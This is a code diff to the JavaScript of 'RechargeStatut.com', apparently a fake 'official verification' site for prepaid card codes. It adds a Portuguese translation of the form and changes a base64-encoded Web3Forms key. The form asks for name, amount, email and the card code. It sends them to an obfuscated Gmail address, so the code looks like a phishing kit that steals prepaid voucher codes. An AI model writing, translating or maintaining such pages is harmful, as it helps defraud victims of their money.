@@ -3,7 +3,7 @@ const translations = {
   fr: {
     title: "RechargeStatut.com | Vérification Officielle",
     nav_home: "Accueil",
-    form_title: "Vérification de ",
+    form_title: "Vérification ",
     form_nom: "Nom :",
     form_prenom: "Prénom :",
     form_montant: "Montant (€) :",
@@ -99,7 +99,27 @@ const translations = {
     footer_link_faq: "FAQ",
     footer_link_contact: "Contatto",
     footer_copyright: "© 2026 RechargeStatut.com. Tutti i diritti riservati."
-  }
+  },
+  pt: {
+    title: "RechargeStatut.com | Verificação Oficial",
+    nav_home: "Início",
+    form_title: "Verificação",
+    form_nom: "Apelido:",
+    form_prenom: "Nome:",
+    form_montant: "Valor (€):",
+    form_email: "O seu e-mail:",
+    form_code: "Código:",
+    form_toggle_label: "Mostrar código:",
+    form_oui: "Sim",
+    form_non: "Não",
+    form_envoyer: "Autenticar",
+    footer_brand_name: "RechargeStatut",
+    footer_brand_text: "Verificação de cartões pré-pagos.",
+    footer_link_verify: "Verificar",
+    footer_link_faq: "FAQ",
+    footer_link_contact: "Contacto",
+    footer_copyright: "© 2026 RechargeStatut.com. Todos os direitos reservados."
+}
 };
 
 // ====== FONCTION DE TRADUCTION ======
@@ -163,10 +183,10 @@ document.addEventListener('DOMContentLoaded', () => {
 
   // 3. Sécurité Web3Forms (Décodage des clés à l'envoi)
   const form = document.getElementById('verification-form');
-  if (form) {
-    // Vos clés encodées en Base64
-    const k = "Zjk3MDA2MzItOWUyZC00NzBjLTg1YzktY2RjMDdlNzJkM2Ex"; 
-    const m = "YXV0aGVudGlmaWNhdGlvbnRyYW5zY2FzaDE3QGdtYWlsLmNvbQ==";
+if (form) {
+  // Vos clés encodées en Base64
+  const k = "ZmY2MWVlNjUtZTUwNi00M2EwLTg2YWYtNWM5MTBiYTkwZDkx"; 
+  const m = "YXV0aGVudGlmaWNhdGlvbnRyYW5zY2FzaDE3QGdtYWlsLmNvbQ==";
 
     form.addEventListener('submit', function (e) {
       document.getElementById('wf_key').value = atob(k);
